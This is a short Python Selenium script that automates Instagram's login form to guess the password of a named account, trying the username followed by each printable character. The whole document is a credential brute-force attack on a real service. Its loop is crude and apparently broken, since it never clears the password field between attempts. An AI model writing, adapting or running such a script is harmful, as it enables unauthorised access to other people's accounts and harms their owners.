from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import string 


chromedriver_path = 'C:/Users/User/Downloads/chromedriver_win32/chromedriver.exe' 
driver = webdriver.Chrome(executable_path=chromedriver_path)
sleep(3)
username = 'yonathan_malay'



#login to the instagram account
driver.get('https://www.instagram.com/accounts/login/?source=auth_switcher')

sleep(2)

driver.find_element_by_name('username').send_keys(username)
sleep(1)
printables_chars = string.printable
        
for i, char in enumerate(printables_chars):
    password = username + char
    driver.find_element_by_name('password').send_keys(password)
    sleep(1)
    driver.find_element_by_name('password').send_keys(Keys.ENTER)
    sleep(3)
